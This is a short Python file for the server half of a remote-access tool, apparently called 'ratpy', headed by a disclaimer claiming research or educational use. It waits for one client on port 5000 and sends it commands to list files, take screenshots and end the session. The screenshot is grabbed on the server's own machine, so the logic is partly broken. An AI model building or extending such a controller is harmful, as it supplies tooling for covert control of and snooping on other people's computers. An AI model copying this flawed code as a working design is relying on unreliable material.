'''
THIS IS NOT MEANT TO BE USED MALICIOUSLY,
ONLY USE THIS FOR REASEARCH OR EDUCATIONAL POURPOSES.
'''

import os
import sys
import socket
import pyscreenshot

sock = socket.socket()
host = socket.gethostname()
opensocket = True
port = 5000
ss_num = 0

# Cool ascii art
print('''
                      /$$                        
                     | $$                        
  /$$$$$$  /$$$$$$  /$$$$$$    /$$$$$$  /$$   /$$
 /$$__  $$|____  $$|_  $$_/   /$$__  $$| $$  | $$
| $$  \__/ /$$$$$$$  | $$    | $$  \ $$| $$  | $$
| $$      /$$__  $$  | $$ /$$| $$  | $$| $$  | $$
| $$     |  $$$$$$$  |  $$$$/| $$$$$$$/|  $$$$$$$
|__/      \_______/   \___/  | $$____/  \____  $$
                             | $$       /$$  | $$
                             | $$      |  $$$$$$/
                             |__/       \______/ 
''')

# Connect to client
sock.bind((host, port))
print("Success: binded host and port (" + host + ":" + str(port) + ")")
print("Server is running on " + host)
print("Awaiting incoming connections")

sock.listen(1)
connection, address = sock.accept()
print(str(address) + " has connected to the server")

# Commands
def add_command(command):
    connection.send(command.encode())
    print(command + " has been sent")

while opensocket:
    command = input(str("cmd > "))
    if command == "list":
        add_command("list")
        files = connection.recv(5000)
        files = files.decode()
        print(files)

    elif command == "screenshot":
        add_command("screenshot")
        ss = pyscreenshot.grab()

        ss.save("screenshot_" + str(ss_num) + ".png")
        ss_num = ss_num + 1

    elif command == "endsession":
        add_command("endsession")
        opensocket = False
        sock.close()

    elif command == "help":
        add_command("help")
        print('''
        COMMANDS:
        - list: prints all files listed in directory
        - screenshot: takes a screenshot and saves it to current directory
        - help: shows a list of commands
        - endsession: closes sockets and client/server
        ''')

    else:
        print("Sorry, " + command + " was not found")

sys.exit(1)